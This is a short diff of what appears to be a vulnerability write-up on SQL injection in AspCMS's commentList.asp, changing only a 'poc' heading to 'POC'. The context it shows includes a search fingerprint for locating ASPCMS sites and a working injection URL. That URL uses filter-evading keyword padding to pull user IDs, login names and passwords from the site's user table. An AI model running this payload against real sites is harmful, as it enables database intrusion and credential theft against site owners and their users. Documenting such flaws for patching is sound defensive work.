@@ -8,7 +8,7 @@ AspCMS commentList.asp 存在SQL注入漏洞，攻击者通过漏洞可以获取
 app="ASPCMS"
 ```
 
-## poc
+## POC
 
 ```asp
 /plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user
